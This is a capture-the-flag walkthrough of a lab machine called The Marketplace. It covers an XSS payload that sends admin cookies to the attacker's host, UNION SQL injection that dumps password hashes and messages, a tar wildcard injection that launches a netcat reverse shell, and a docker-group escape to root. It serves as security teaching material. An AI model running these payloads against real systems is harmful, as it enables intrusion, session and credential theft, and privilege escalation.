## The Marketplace

# Enumeration
```
# Nmap 7.91 scan initiated Wed May 12 23:12:58 2021 as: nmap -sCV -oN nmap/initial -vvv -p 22,80,32768 10.10.160.210
Nmap scan report for 10.10.160.210
Host is up, received echo-reply ttl 61 (0.15s latency).
Scanned at 2021-05-12 23:12:59 PDT for 18s

PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLj5F//uf40JILlSfWp95GsOiuwSGSKLgbFmUQOACKAdzVcGOteVr3lFn7vBsp6xWM5iss8APYi9WqKpPQxQLr2jNBybW6qrNfpUMVH2lLcUHkiHkFBpEoTP9m/6P9bUDCe39aEhllZOCUgEtmLpdKl7OA3tVjhthrNHNPW+LVfkwlBgxGqnRWxlY6XtlsYEKfS1B+wODrcVwUxOHthDps/JMDUvkQUfgf/jpy99+twbOI1OZbCYGJFtV6dZoRqsp1Y4BpM3VjSrrvV0IzYThRdssrSUgOnYrVOZl8MrjMFAxOaFbTF2bYGAS/T68/JxVxktbpGN/1iOrq3LRhxbF1
|   256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHyTgq5FoUG3grC5KNPAuPWDfDbnaq1XPRc8j5/VkmZVpcGuZaAjJibb9RVHDlbiAfVxO2KYoOUHrpIRzKhjHEE=
|   256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA2ol/CJc6HIWgvu6KQ7lZ6WWgNsTk29bPKgkhCvG2Ar
80/tcp    open  http    syn-ack ttl 60 nginx 1.19.2
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry
|_/admin
|_http-server-header: nginx/1.19.2
|_http-title: The Marketplace
32768/tcp open  http    syn-ack ttl 60 Node.js (Express middleware)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry
|_/admin
|_http-title: The Marketplace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed May 12 23:13:17 2021 -- 1 IP address (1 host up) scanned in 18.50 seconds
```

# Web Server Port 80

The web server on port 80 has a /admin page we are not authorized to view but we can make an account to try and get some info. With our account we get a couple pieces of information. Firstly we now have a cookie which when decrypted from base 64 gives us the following format
```
{"alg":"HS256","typ":"JWT"}{"userId":4,"username":"test","admin":false,"iat":1620886606}.H¼.ò.¨vl|.O.7¾pØ.¡
».£ïf¹î. \0¨
```

So a very likely vector of attack will be to forge a admin cookie or steal one so lets look around and see if we can find a way to steal it. We are able to create listings and can test for XSS with as the title and description
```
<script>alert(1)</script>test
```

Sure enough both fields are vulnerable to XSS and there is an interesting option to report the listing to admins so lets create a listing with the following payload as the title
```
<script>fetch("http://[ip:port]/"+document.cookie)</script>test
```

We have netcat listening on the port we designated in our payload and upon creation receive the following
```
GET /token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoidGVzdCIsImFkbWluIjpmYWxzZSwiaWF0IjoxNjIwODg2NjA2fQ.ZIvJn_yrah2bHwAT5E3vnDYAKENuxyj72a57pSgXDCo HTTP/1.1
Host: IP:PORT
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.160.210:32768/item/5
Origin: http://10.10.160.210:32768
Connection: keep-alive
```

Sure enough we got our cookie so lets report the listing and see if we receive another cookie from an admin
```
GET /token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MjA4ODgzOTR9.K8vij_h027zriEATHvIe6jYSvi04CI6uCxm84C_mRo0 HTTP/1.1
Host: IP:PORT
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/85.0.4182.0 Safari/537.36
Accept: */*
Origin: http://localhost:3000
Referer: http://localhost:3000/item/5
Accept-Encoding: gzip, deflate
Accept-Language: en-US

{"alg":"HS256","typ":"JWT"}{"userId":2,"username":"michael","admin":true,"iat":1620888394}+Ëâ..6ï:â..Ç¼.º..¯.N.#«.Æo8
dhÔ
```

Sure enough we got the cookie of an admin user so lets change our cookie, and we now have access to the /admin panel where we get our first flag and the following user listing
```
User system
ID: 1
Is administrator: false
User michael
ID: 2
Is administrator: true
User jake
ID: 3
Is administrator: true
User test
ID: 4
Is administrator: false
```

If we click on a user we get a page to delete the user and more interestingly a parameter in the url
```
http://10.10.160.210:32768/admin?user=2
```

We quickly test for sqli with a '
```
http://10.10.160.210:32768/admin?user=2%27

Error: ER_PARSE_ERROR: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
```

So we have sqli so lets figure out how many columns we have. 
```
10.10.160.210:32768/admin?user=2 order by 5
```

After testing 2-4 we find that we receive an error on 5, so we have 4 columns. Looking at the user listing we know there is no user 0 so we can see which columns are reflected with the following
```
http://10.10.160.210:32768/admin?user=0 union select 1,2,3,4

User 1
User 2
ID: 1
Is administrator: true 
```

So it seems columns 1 and 2 are reflected. Next lets enumerate the database
```
user=0 union select 1,group_concat(schema_name),3,4 from information_schema.schemata-- -

User 1
User information_schema,marketplace
ID: 1
Is administrator: true 
```

marketplace is our database next lets get the tables
```
10.10.160.210:32768/admin?user=0 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='marketplace'-- -

User 1
User items,messages,users
ID: 1
Is administrator: true 
```

Lets get some user information first, so lets get the columns for the users table
```
http://10.10.160.210:32768/admin?user=0 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'-- -

User 1
User id,isAdministrator,password,username
ID: 1
Is administrator: true 
```

Now we can go ahead and get the contents of this table
```
http://10.10.160.210:32768/admin?user=0 union select 1,group_concat(id,':',username,':',password,':',isAdministrator),3,4 from marketplace.users-- -


User 
1:system:$2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW:0,
2:michael:$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q:1,
3:jake:$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG:1,
4:test:$2b$10$zCeYI0Tqe/NO8RRbGmbnd.Hu.EpNknzhKzFX/NL5IfuZXKqsstbzC:0 
```

So we have some hashes that we can potentially crack and test for reuse on ssh, but lets get the information in the messages table first, so start again by getting the columns
```
http://10.10.160.210:32768/admin?user=0 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='messages'-- -

User 1
User id,is_read,message_content,user_from,user_to
ID: 1
Is administrator: true 
```

Then lets grab what I feel would be most relevant with the following
```
http://10.10.160.210:32768/admin?user=0 union select 1,group_concat(user_from,':',user_to,':',message_content),3,4 from marketplace.messages-- -

User 
1:3:Hello! An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password. Your new password is: REDACTED,
1:4:Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!,
1:4:Thank you for your report. We have reviewed the listing and found nothing that violates our rules.
```

The user_from and user_to fields return a number but we can use the user table information we have to determine that these correspond to the id's and that we now have a possible password for user id 3 or jake so lets try and connect. Sure enough the credentials have not been changed and we have a foothold

# Initial foothold

We go ahead and find the user.txt flag in jake's home directory and the following
```
jake@the-marketplace:~$ sudo -l
Matching Defaults entries for jake on the-marketplace:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh

jake@the-marketplace:~$ cat /opt/backups/backup.sh
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```

Looks like we can run /opt/backups/backup.sh as michael and the script contains a tar command with a wildcard which I have had previous experience with but is covered in the following article, https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
So we can exploit this as follows 
```
jake@the-marketplace:/tmp/exp$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip port >/tmp/f" > shell.sh
jake@the-marketplace:/tmp/exp$ echo "" > "--checkpoint-action=exec=sh shell.sh"
jake@the-marketplace:/tmp/exp$ echo "" > --checkpoint=1
```

We start our listener then execute the script as michael
```
sudo -u michael /opt/backups/backup.sh
```

We get our reverse shell and stablize it. We then check for sudo, cronjobs, and suid but to no avail. However checking our id shows the following
```
michael@the-marketplace:/home/michael$ id
uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
```

Looks like we are in the docker group so lets leverage this to use an image to make a new container with the root filesystem mounted and start a shell. First we check if we have images available, otherwise we have to upload one
```
michael@the-marketplace:/home/michael$ docker image ls
REPOSITORY                   TAG                 IMAGE ID            CREATED             SIZE
themarketplace_marketplace   latest              6e3d8ac63c27        8 months ago        2.16GB
nginx                        latest              4bb46517cac3        9 months ago        133MB
node                         lts-buster          9c4cc2688584        9 months ago        886MB
mysql                        latest              0d64f46acfd1        9 months ago        544MB
alpine                       latest              a24bb4013296        11 months ago       5.57MB
```

Plenty available so lets use alpine and execute the following
```
michael@the-marketplace:/home/michael$ docker run -v /:/mnt --rm -it alpine sh
/ # whoami
root
~ # cd /mnt/root
/mnt/root # ls -la
total 28
drwx------    4 root     root          4096 Aug 23  2020 .
drwxr-xr-x   23 root     root          4096 Aug 23  2020 ..
lrwxrwxrwx    1 root     root             9 Aug 23  2020 .bash_history -> /dev/null
-rw-r--r--    1 root     root          3106 Apr  9  2018 .bashrc
drwxr-xr-x    3 root     root          4096 Aug 23  2020 .local
-rw-r--r--    1 root     root           148 Aug 17  2015 .profile
drwx------    2 root     root          4096 Aug 23  2020 .ssh
-r--------    1 root     root            38 Aug 23  2020 root.txt
```

And we have a root shell. To summarize the above, 
```
-v /:/mnt -> mounts / the root directory to /mnt inside the container hence navigating to /mnt/root

--rm -> removes the container when our user exits

-it -> makes the container interactive and with tty

alpine -> the image we are using

sh -> the binary we wish to run when the container start, a shell
```

